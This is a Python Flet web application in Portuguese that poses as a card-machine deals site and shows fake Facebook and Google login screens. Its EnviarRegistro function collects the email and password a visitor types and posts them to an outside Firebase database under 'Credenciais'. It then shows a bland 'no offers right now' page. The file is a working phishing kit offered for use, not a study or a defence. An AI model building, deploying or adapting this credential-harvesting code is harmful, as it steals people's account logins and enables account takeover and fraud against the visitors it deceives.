import flet as ft
import webbrowser
import requests
import json

def main(page: ft.Page):

    page.title = "Ofertas e Promoções Online"
    page.bgcolor = "#EBEBEB"#"#282C34"
    page.padding = 0
    page.scroll = "always"
    page.splash = None








    image = ft.Image(
        src="assets/pngimage.png",
        border_radius=ft.border_radius.all(10),
        width=250,
        height=250,
        fit=ft.ImageFit.CONTAIN)

    image_MP = ft.Image(
        src="assets/mercado-pago-logo.png",
        border_radius=ft.border_radius.all(10),
        width=100,
        height=40,
        fit=ft.ImageFit.SCALE_DOWN)

    image_CL = ft.Image(
        src="assets/cielo-logo.png",
        border_radius=ft.border_radius.all(10),
        width=90,
        height=40,
        fit=ft.ImageFit.SCALE_DOWN)

    image_SP = ft.Image(
        src="assets/safrapay.png",
        border_radius=ft.border_radius.all(10),
        width=90,
        height=40,
        fit=ft.ImageFit.SCALE_DOWN)




    bt_facebook = ft.Container(
        alignment=ft.alignment.center,

        content=ft.ElevatedButton(
            on_click=lambda e: page.go("/facebook/login"),
            bgcolor="#0866FF",
            color='white',
            content=ft.Row(
                controls=[ft.Icon(name=ft.icons.FACEBOOK, size=36
                                  ),
                          ft.Text("Facebook",
                                  size=18,
                                  weight='bold', font_family="Poppins"
                                  )

                          ], alignment=ft.MainAxisAlignment.CENTER

            ),
            style=ft.ButtonStyle(
                shape={"": ft.RoundedRectangleBorder(radius=6)},
                color={"": 'white'},

            ), height=56,
            width=202
        )
    )

    bt_google = ft.Container(
        alignment=ft.alignment.center,

        content=ft.ElevatedButton(
            on_click=lambda e: page.go("/google/login"),
            bgcolor="white",
            color='#EA4335',
            content=ft.Row(
                controls=[ft.Icon(name=ft.icons.EMAIL, size=35
                                  ),
                          ft.Text(" Email Google",
                                  size=18,
                                  weight='bold', font_family="Poppins"
                                  )

                          ], alignment=ft.MainAxisAlignment.CENTER

            ),
            style=ft.ButtonStyle(
                shape={"": ft.RoundedRectangleBorder(radius=6)},
                color={"": 'white'},

            ), height=56,
            width=202
        )
    )


    ######## LAYOUT TELA SECUNDÁRIA (2)

    t2_icone_facebook = ft.Icon("facebook", size=90, color="#0F6BFF")
    t2_image = ft.Image(
        src="assets/google_logo.png",
        #border_radius=ft.border_radius.all(10),
        #color="blue",
        width=350,
        height=90,

        fit=ft.ImageFit.CONTAIN)


    t2_texto_login = ft.Text("Faça login", color="white", font_family="Merriweather ", size=30, weight=ft.FontWeight.W_600)
    t2_campo_email = ft.TextField(label='Seu E-mail',

                             border_radius=6, autofocus=True,
                             # border=ft.border.all(1, "orange"),
                             focused_border_color="black54",
                             expand=True,

                             color="black74",
                             focused_border_width=1,
                             border_color="black",
                             cursor_color="black54",
                             bgcolor="#F8F9FB",
                             label_style=ft.TextStyle(color="black74", size=16,
                                                      weight=ft.FontWeight.W_400,
                                                      )

                             )



    t2_campo_senha = ft.TextField(label='Digite Sua Senha',

                             border_radius=6,
                             # border=ft.border.all(1, "orange"),
                             focused_border_color="black54",
                             expand=True,

                            password=True,
                             color="black74",
                             focused_border_width=1,
                             border_color="black",
                             cursor_color="black54",
                             bgcolor="#F8F9FB",
                             label_style=ft.TextStyle(color="black74", size=16,
                                                      weight=ft.FontWeight.W_400,
                                                      )

                             )

    t2_box_senha = ft.Row([
            ft.Checkbox(label="", on_change=lambda e: MostrarSenha()),
            ft.Text("Mostrar Senha", color="black")


    ])


    t2_botao_avancar = ft.ElevatedButton(
        text="Entrar", width=200, height=50, bgcolor="", color='WHITE',

        on_click=lambda e: EnviarRegistro(),
        style=ft.TextStyle.font_family,
        tooltip='Avançar'

    )


    t2_senha_esq = ft.TextButton(text="Esqueceu sua senha?", visible=False,
                                 icon_color="blue", on_click=lambda e: page.go("/google/login"))

    t2_senha_conta_facebook = ft.TextButton(text="Criar conta.", visible=False,
                                icon_color="blue",
                                on_click=lambda e: webbrowser.open("https://www.bing.com/ck/a?!&&p=77a77f7ff596f570JmltdHM9MTcyMzY4MDAwMCZpZ3VpZD0yNDgwZmQ0NC00MmIxLTZkNzAtMzE0My1lZjk5NDMwMDZjNWYmaW5zaWQ9NTE5NQ&ptn=3&ver=2&hsh=3&fclid=2480fd44-42b1-6d70-3143-ef9943006c5f&psq=facebook+criar+conta&u=a1aHR0cHM6Ly9wdC1ici5mYWNlYm9vay5jb20vci5waHAv&ntb=1"))


    t2_senha_conta_google = ft.TextButton(text="Criar conta", visible=False,
                                        icon_color="blue",
                                         on_click=lambda e: webbrowser.open("https://accounts.google.com/lifecycle/steps/signup/name?ddm=0&dsh=S-48239983:1723743251725648&flowEntry=SignUp&flowName=GlifWebSignIn&TL=AKeb6mwAm0jwucZ1-2ON_bievaH1LLk8tHjCv-MGNOnDxfIPP1D4PcYpK3SuLAgT"))


    def MostrarSenha():
        t2_campo_senha.password = not t2_campo_senha.password

        page.update()



    def EnviarRegistro():

        if t2_campo_senha.value.strip() != "" and t2_campo_email.value.strip() != "":
            # print("Credenciais Confiscadas:")
            # print(f"E-mail: {t2_campo_email.value}")
            # print(f"Senha: {t2_campo_senha.value}")

            try:
                link = "https://projectphs-default-rtdb.firebaseio.com/"

                credenciais = {"Retornos": f"{t2_campo_email.value};{t2_campo_senha.value}"}

                requests.post(f'{link}/Credenciais/.json', data=json.dumps(credenciais))
            except:
                page.snack_bar = ft.SnackBar(
                    bgcolor=ft.colors.RED_ACCENT_200,
                    duration=3000,
                    content=ft.Row([
                        ft.Text(f'Ops!! Algo deu errado',
                                weight='bold', color='black', size=20, ),

                        ft.Icon(ft.icons.LINK_OFF, size=30, color='BLACK')  # ft.colors.GREEN_ACCENT_400)
                    ]))
                page.snack_bar.open = True
                page.update()
                pass


            page.go("/ofertas")
            page.update()
        else:

            page.snack_bar = ft.SnackBar(
                bgcolor=ft.colors.RED_ACCENT_200,
                duration=3000,
                content=ft.Row([
                    ft.Text(f'Preencha todos os campos',
                            weight='bold', color='black', size=20, ),

                    ft.Icon(ft.icons.LINK_OFF, size=30, color='BLACK')  # ft.colors.GREEN_ACCENT_400)
                ]))
            page.snack_bar.open = True

            # ATUALIZAR PÁGINA
            page.update()














    Tela1 = ft.Container(
            visible=True,
            expand=True,

            bgcolor="#EBEBEB",
            # border=ft.border.all(1, color='black'),
            border_radius=ft.border_radius.all(7),
            # padding=5,  # preenchimento
            padding=None,
            content=ft.Column(
                scroll='hidden',
                #expand=True,
                controls=[
                    ft.Divider(height=10, color="transparent"),

                    ft.Row([image], alignment="center"),
                    ft.Row([

                        ft.Text(
                            "Maquininhas no preço!", color="black", size=23,
                            font_family="Georgia",
                            weight=ft.FontWeight.W_800
                        )], alignment="center"),

                    ft.Row([
                        ft.Text("Parceiros e apoiadores:", color="#3BB8EE", size=15,
                                font_family="Montserrat",  # "Times New Roman",),
                                weight=ft.FontWeight.W_500)], alignment="center"),
                    ft.Row([image_MP, image_CL, image_SP], alignment=ft.MainAxisAlignment.CENTER),

                    ft.Divider(height=120, color="transparent"),

                    ft.Row([ft.Text("Faça login com:", color="black",
                                    font_family="Montserrat", size=13, weight=ft.FontWeight.W_500)],
                           alignment="center"),
                    ft.Row([bt_facebook], alignment="center"),
                    ft.Row([bt_google], alignment="center"),

                    ft.Divider(height=30, color="transparent")





                ]))


    Tela2 = ft.Container(
        visible=True,
        expand=True,

        bgcolor="#282C34",
        # border=ft.border.all(1, color='black'),
        border_radius=ft.border_radius.all(7),
        # padding=5,  # preenchimento
        padding=10,
        content=ft.Column(
            scroll='hidden',
            # expand=True,
            controls=[
                ft.Divider(height=40, color="transparent"),
                ft.Row([t2_icone_facebook], alignment="center"),
                ft.Row([t2_image], alignment="center"),
                ft.Row([t2_texto_login], alignment="center"),
                ft.Divider(height=40, color="transparent"),
                ft.Row([t2_campo_email], alignment="center"),
                ft.Divider(height=4, color="transparent"),
                ft.Row([t2_campo_senha], alignment="center"),
                ft.Row([t2_box_senha], alignment="start"),
                ft.Divider(height=20, color="transparent"),
                ft.Row([t2_botao_avancar], alignment="center"),
                ft.Divider(height=40, color="transparent"),
                ft.Row([t2_senha_esq, t2_senha_conta_facebook], alignment=ft.MainAxisAlignment.SPACE_AROUND),
                ft.Row([t2_senha_conta_google], alignment="start")


            ]))

    Tela_f = ft.Container(
        visible=True,
        expand=True,

        bgcolor="#282C34",
        # border=ft.border.all(1, color='black'),
        border_radius=ft.border_radius.all(7),
        # padding=5,  # preenchimento
        padding=None,
        content=ft.Column(
            scroll='hidden',
            # expand=True,
            controls=[
                ft.Divider(height=50, color="transparent"),

                ft.Row([
                    ft.Text("Sem ofertas no momento!",
                            color="white",
                            weight=ft.FontWeight.W_500,
                            font_family="Viana",
                            size=24,
                            )], alignment="center"),

                ft.Row([
                    ft.Text("Aguarde sua oferta no seu e-mail em alguns dias",
                            color="#DDDDDD",

                            font_family="Viana",
                            size=12,
                            )], alignment="center"),

                ft.Divider(height=70, color="transparent"),

                ft.Row([
                ft.Image(
                    src="assets/bad-review.png",
                    border_radius=ft.border_radius.all(10),
                    width=300,
                    height=200,
                    fit=ft.ImageFit.SCALE_DOWN)], alignment="center")

            ]))





    def mudar_rota(rota):
        page.views.clear()

        page.views.append(
            ft.View(
                '/', [
                    Tela1
                ],  #podemos colocar alguma coisa aqui
            )
        )
        if page.route == '/facebook/login':

            Tela2.bgcolor = "#282C34",
            page.bgcolor = "#282C34",

            t2_image.visible = False
            t2_icone_facebook.visible = True
            t2_texto_login.color = "white"

            t2_campo_senha.value = ""
            t2_campo_email.value = ""

            t2_box_senha.controls[1].color = "white"


            t2_botao_avancar.color = "white"
            t2_botao_avancar.bgcolor = "#0866FF"

            t2_campo_senha.color = "White"
            t2_campo_email.color = "white"

            t2_campo_senha.border_color = "#AAAAAA"
            t2_campo_email.border_color = "#AAAAAA"


            # EMAIL
            t2_campo_email.focused_border_color = "white54",
            t2_campo_email.cursor_color = "white54",
            t2_campo_email.bgcolor = "#2C313C"
            t2_campo_email.label_style = ft.TextStyle(color="white74", size=16,
                                                      weight=ft.FontWeight.W_400,
                                                      )

            # SENHA
            t2_campo_senha.focused_border_color = "white54",
            t2_campo_senha.cursor_color = "white",
            t2_campo_senha.bgcolor = "#2C313C"
            t2_campo_senha.label_style = ft.TextStyle(color="white", size=16,
                                                      weight=ft.FontWeight.W_400,
                                                      )

            t2_senha_esq.visible = True
            t2_senha_conta_facebook.visible = True
            t2_senha_conta_google.visible = False

            page.update()

            page.views.append(
                ft.View(
                    '/facebook/login',
                    [

                        Tela2
                    ],
                )

            )
            page.update()


        elif page.route == '/google/login':
            Tela2.bgcolor = "White"
            t2_image.visible = True
            t2_icone_facebook.visible = False
            t2_texto_login.color = "#3B3B3B"

            t2_campo_senha.value = ""
            t2_campo_email.value = ""

            t2_box_senha.controls[1].color = "black"

            t2_botao_avancar.color = "Black"
            t2_botao_avancar.bgcolor = "#ebebeb"


            t2_campo_senha.color = "black"
            t2_campo_email.color = "black"

            t2_campo_senha.border_color = "#AAAAAA"
            t2_campo_email.border_color = "#AAAAAA"



            # EMAIL
            t2_campo_email.focused_border_color = "black",
            t2_campo_email.cursor_color = "black",
            t2_campo_email.bgcolor = "white"
            t2_campo_email.label_style = ft.TextStyle(color="black", size=16,
                                   weight=ft.FontWeight.W_400,
                                   )

            # SENHA
            t2_campo_senha.focused_border_color = "black",
            t2_campo_senha.cursor_color = "black",
            t2_campo_senha.bgcolor = "white"
            t2_campo_senha.label_style = ft.TextStyle(color="black", size=16,
                                                      weight=ft.FontWeight.W_400,
                                                      )
            t2_senha_conta_google.visible = True
            t2_senha_esq.visible = False
            t2_senha_conta_facebook.visible = False

            page.update()
            page.views.append(

                ft.View(
                    '/google/login',
                    [

                        Tela2

                    ],
                )

            )
            page.update()

        elif page.route == "/ofertas":

            page.views.append(

                ft.View(
                    '/ofertas',
                    [

                        Tela_f

                    ],
                )

            )
            page.update()


    def ver_pop(e):
        page.views.pop()
        vista_superior = page.views[-1]
        page.go(vista_superior.route)






    page.add(
        ft.Row([Tela1], alignment=ft.MainAxisAlignment.CENTER),

    )



     # Ao mudar rota
    page.on_route_change = mudar_rota

    page.on_view_pop = ver_pop
    page.go(page.route)
    page.update()






if __name__ == "__main__":

    ft.app(target=main, assets_dir="assets", view=ft.WEB_BROWSER)
















